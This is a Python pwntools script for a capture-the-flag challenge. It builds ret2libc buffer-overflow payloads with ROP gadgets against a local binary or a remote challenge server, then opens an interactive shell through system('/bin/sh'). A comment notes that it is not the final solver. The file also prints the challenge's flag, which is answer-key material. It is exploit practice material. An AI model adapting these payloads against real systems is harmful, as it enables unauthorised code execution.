import sys
from pwn import *

# Reference : https://stacklikemind.io/ret2libc-aslr
#
# This file is not the solver, instead look at solve2.py
#

# Flag : Neko{Th4t's_4_n1c3_f33db4ck}

if sys.argv[1] == "local":
	elf = ELF("./vuln")
	prog = elf.process()
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif sys.argv[1] == "remote":
	prog = remote('pwn2.bsidesahmedabad.in', 9001)
	libc = ELF("./libc-2.31.so")
else:
	print("[-] Invalid command")
	sys.exit()

exit_addr = libc.symbols['exit']
puts_addr = libc.symbols['puts']
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b"/bin/sh"))
print("[+] exit libc address : " + str(hex(exit_addr)))
print("[+] puts libc address : " + str(hex(puts_addr)))
print("[+] system libc address : " + str(hex(system_addr)))
print("[+] /bin/sh address : " + str(hex(bin_sh_addr)))

# Gadgets
ret = p64(0x040101a)
pop_rdi_ret = p64(0x0401273)
main_addr = p64(0x004010b0)

payload1 = b"A"*72 + pop_rdi_ret + p64(bin_sh_addr) + ret + p64(system_addr)
payload2 = b"A"*72 + p64(system_addr) + p64(bin_sh_addr) + p64(exit_addr)

print(prog.recvuntil("\n").decode())
prog.sendline(payload1)
print(prog.recvuntil("\n").decode())

prog.interactive()
